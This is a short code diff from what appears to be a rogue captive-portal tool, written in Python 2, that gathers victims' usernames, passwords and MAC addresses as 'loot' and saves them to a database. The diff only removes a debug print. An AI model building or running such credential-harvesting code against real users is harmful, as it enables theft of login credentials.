@@ -90,7 +90,6 @@ class CaptivePortal(BaseHTTPServer.BaseHTTPRequestHandler):
 		loot.update(Username = username)
 		loot.update(MAC = IP_MAC[1].replace("\n","")) 
 		loot.update(Password = password)
-		print loot
 		d = queries()
 		d.db_connect(workspace) 
 		d.loot(loot)
